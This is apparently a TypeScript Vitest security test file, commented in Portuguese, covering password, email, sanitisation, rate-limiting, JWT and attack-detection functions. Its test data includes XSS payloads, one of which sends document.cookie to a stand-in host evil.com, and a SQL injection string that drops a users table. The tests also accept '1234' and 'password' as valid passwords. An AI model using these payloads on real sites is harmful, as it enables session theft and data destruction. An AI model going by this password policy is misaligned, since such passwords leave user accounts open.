/**
 * Testes de Segurança
 * Testa todas as funcionalidades de segurança implementadas
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { validatePasswordSecurity, validateEmail, sanitizeInput } from '../src/lib/security-config';
import { checkRateLimit } from '../src/lib/rate-limiter';
import { 
  logSecurityEvent, 
  SecurityEventType, 
  isIPSuspicious, 
  shouldBlockIP,
  getSecurityStats,
  detectAttackPatterns
} from '../src/lib/security-monitor';
import { getJWTSecret, verifyJWTToken, createJWTToken } from '../src/lib/jwt-utils';

// Mock do NextRequest para testes de rate limiting
class MockNextRequest {
  public url: string;
  public ip: string;
  public headers: Map<string, string>;

  constructor(url: string, ip: string = '127.0.0.1') {
    this.url = url;
    this.ip = ip;
    this.headers = new Map();
  }

  get nextUrl() {
    return new URL(this.url);
  }
}

describe('Validação de Senha', () => {
  it('deve aceitar senhas válidas', () => {
    const validPasswords = [
      '1234',
      'abcd',
      'ABCD',
      'test',
      'senha123',
      'MinhaSenh@789'
    ];

    validPasswords.forEach(password => {
      const result = validatePasswordSecurity(password);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
  });

  it('deve rejeitar senhas muito curtas', () => {
    const shortPasswords = [
      '', // vazia
      '1', // 1 caractere
      '12', // 2 caracteres
      '123' // 3 caracteres
    ];

    shortPasswords.forEach(password => {
      const result = validatePasswordSecurity(password);
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors[0]).toContain('Senha deve ter pelo menos 4 caracteres');
    });
  });

  it('deve aceitar qualquer senha com 4 ou mais caracteres', () => {
    const validPasswords = [
      '1234', // apenas números
      'abcd', // apenas letras minúsculas
      'ABCD', // apenas letras maiúsculas
      '!@#$', // apenas caracteres especiais
      'Test', // misto
      'aaaa', // caracteres repetidos
      'password', // senha comum
      '123456789' // sequência
    ];

    validPasswords.forEach(password => {
      const result = validatePasswordSecurity(password);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
  });
});

describe('Validação de Email', () => {
  it('deve aceitar emails válidos', () => {
    const validEmails = [
      'usuario@exemplo.com',
      'test.email@domain.co.uk',
      'user+tag@example.org',
      'valid.email123@test-domain.com'
    ];

    validEmails.forEach(email => {
      const result = validateEmail(email);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
  });

  it('deve rejeitar emails inválidos', () => {
    const invalidEmails = [
      'email-invalido',
      '@domain.com',
      'user@',
      ''
    ];

    invalidEmails.forEach(email => {
      const result = validateEmail(email);
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });
  });

  it('deve rejeitar domínios suspeitos', () => {
    const suspiciousEmails = [
      'user@tempmail.com',
      'test@10minutemail.net',
      'fake@guerrillamail.org'
    ];

    suspiciousEmails.forEach(email => {
      const result = validateEmail(email);
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Domínio de email não permitido');
    });
  });
});

describe('Sanitização de Entrada', () => {
  it('deve sanitizar caracteres perigosos', () => {
    const input = '<script>alert("XSS")</script><img src="x" onerror="alert(1)">document.location="evil.com"';
    const sanitized = sanitizeInput(input);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('onerror');
    expect(sanitized).not.toContain('document.');
    expect(sanitized).not.toContain('alert(');
    expect(sanitized).toContain('&lt;');
    expect(sanitized).toContain('&gt;');
  });

  it('deve preservar texto seguro', () => {
    const safeInputs = [
      'Texto normal',
      'Email: usuario@exemplo.com',
      'Números: 123456',
      'Símbolos seguros: @#$%'
    ];

    safeInputs.forEach(input => {
      const sanitized = sanitizeInput(input);
      // Deve manter o conteúdo básico (sem caracteres perigosos)
      expect(sanitized.length).toBeGreaterThan(0);
    });
  });
});

describe('Rate Limiting', () => {
  beforeEach(() => {
    // Limpa o store de rate limiting entre testes
    vi.clearAllMocks();
  });

  it('deve permitir requisições dentro do limite', () => {
    const request = new MockNextRequest('http://localhost:3001/api/test', '192.168.1.1') as any;
    
    const result = checkRateLimit(request);
    expect(result.allowed).toBe(true);
    expect(result.remaining).toBeGreaterThan(0);
  });

  it('deve aplicar limites diferentes para endpoints diferentes', () => {
    const loginRequest = new MockNextRequest('http://localhost:3001/api/auth/login', '192.168.1.2') as any;
    const queueRequest = new MockNextRequest('http://localhost:3001/api/queue', '192.168.1.2') as any;
    
    const loginResult = checkRateLimit(loginRequest);
    const queueResult = checkRateLimit(queueRequest);
    
    // Login deve ter limite mais restritivo
    expect(loginResult.remaining).toBeLessThan(queueResult.remaining);
  });
});

describe('JWT Utils', () => {
  beforeEach(() => {
    // Define JWT_SECRET para os testes
    process.env.JWT_SECRET = 'test-secret-key-with-minimum-32-characters-for-security';
  });

  it('deve criar e verificar tokens JWT válidos', () => {
    const payload = { userId: '123', email: 'test@example.com' };
    
    const token = createJWTToken(payload);
    expect(token).toBeDefined();
    expect(typeof token).toBe('string');
    
    const decoded = verifyJWTToken(token);
    expect(decoded).toBeDefined();
    expect(decoded.userId).toBe('123');
    expect(decoded.email).toBe('test@example.com');
  });

  it('deve rejeitar tokens inválidos', () => {
    const invalidTokens = [
      'token-invalido',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
      '',
      'bearer token'
    ];

    invalidTokens.forEach(token => {
      const result = verifyJWTToken(token);
      expect(result).toBeNull();
    });
  });

  it('deve falhar quando JWT_SECRET não está definido', () => {
    delete process.env.JWT_SECRET;
    
    expect(() => getJWTSecret()).toThrow('JWT_SECRET é obrigatório');
  });
});

describe('Monitoramento de Segurança', () => {
  const testIP = '192.168.1.100';

  beforeEach(() => {
    // Limpa estatísticas entre testes
    vi.clearAllMocks();
  });

  it('deve registrar eventos de segurança', () => {
    logSecurityEvent(SecurityEventType.LOGIN_FAILURE, testIP, {
      email: 'test@example.com',
      severity: 'medium'
    });

    const stats = getSecurityStats('1h');
    expect(stats.totalEvents).toBeGreaterThan(0);
    expect(stats.eventsByType[SecurityEventType.LOGIN_FAILURE]).toBe(1);
  });

  it('deve detectar IPs suspeitos após múltiplos eventos', () => {
    // Simula múltiplas tentativas de login falhadas
    for (let i = 0; i < 15; i++) {
      logSecurityEvent(SecurityEventType.LOGIN_FAILURE, testIP);
    }

    expect(isIPSuspicious(testIP)).toBe(true);
  });

  it('deve recomendar bloqueio para IPs com muitos eventos', () => {
    // Simula muitos eventos suspeitos
    for (let i = 0; i < 25; i++) {
      logSecurityEvent(SecurityEventType.RATE_LIMIT_EXCEEDED, testIP);
    }

    expect(shouldBlockIP(testIP)).toBe(true);
  });

  it('deve detectar padrões de ataque', () => {
    // SQL Injection
    let patterns = detectAttackPatterns(
      undefined,
      undefined,
      "'; DROP TABLE users; --"
    );
    expect(patterns).toContain(SecurityEventType.SQL_INJECTION_ATTEMPT);

    // XSS
    patterns = detectAttackPatterns(
      undefined,
      undefined,
      '<script>alert("xss")</script>'
    );
    expect(patterns).toContain(SecurityEventType.XSS_ATTEMPT);

    // User Agent suspeito
    patterns = detectAttackPatterns(
      'sqlmap/1.0',
      undefined,
      undefined
    );
    expect(patterns).toContain(SecurityEventType.SUSPICIOUS_ACTIVITY);

    // Endpoint sensível
    patterns = detectAttackPatterns(
      undefined,
      '/admin/config',
      undefined
    );
    expect(patterns).toContain(SecurityEventType.UNAUTHORIZED_ACCESS);
  });
});

describe('Integração de Segurança', () => {
  it('deve funcionar em conjunto - cenário de ataque', () => {
    const attackerIP = '10.0.0.1';
    const maliciousPayload = "<script>document.location='http://evil.com/'+document.cookie</script>";
    
    // 1. Detecta padrão de ataque
    const patterns = detectAttackPatterns(undefined, undefined, maliciousPayload);
    expect(patterns.length).toBeGreaterThan(0);
    
    // 2. Registra evento de segurança
    patterns.forEach(pattern => {
      logSecurityEvent(pattern, attackerIP, {
        severity: 'high',
        details: { payload: maliciousPayload }
      });
    });
    
    // 3. Sanitiza entrada
    const sanitized = sanitizeInput(maliciousPayload);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('document.location');
    
    // 4. Verifica se IP se tornou suspeito
    const stats = getSecurityStats('1h');
    expect(stats.totalEvents).toBeGreaterThan(0);
  });

  it('deve validar fluxo completo de autenticação segura', () => {
    const email = 'usuario@exemplo.com';
    const password = 'MinhaSenh@Segura123';
    
    // 1. Valida email
    const emailValidation = validateEmail(email);
    expect(emailValidation.isValid).toBe(true);
    
    // 2. Valida senha
    const passwordValidation = validatePasswordSecurity(password);
    expect(passwordValidation.isValid).toBe(true);
    expect(passwordValidation.strength).toBe('strong');
    
    // 3. Cria token JWT
    process.env.JWT_SECRET = 'test-secret-key-with-minimum-32-characters-for-security';
    const token = createJWTToken({ userId: '123', email });
    expect(token).toBeDefined();
    
    // 4. Verifica token
    const decoded = verifyJWTToken(token);
    expect(decoded).toBeDefined();
    expect(decoded.email).toBe(email);
    
    // 5. Registra login bem-sucedido
    logSecurityEvent(SecurityEventType.LOGIN_SUCCESS, '192.168.1.1', {
      userId: '123',
      email,
      severity: 'low'
    });
    
    const stats = getSecurityStats('1h');
    expect(stats.eventsByType[SecurityEventType.LOGIN_SUCCESS]).toBe(1);
  });
});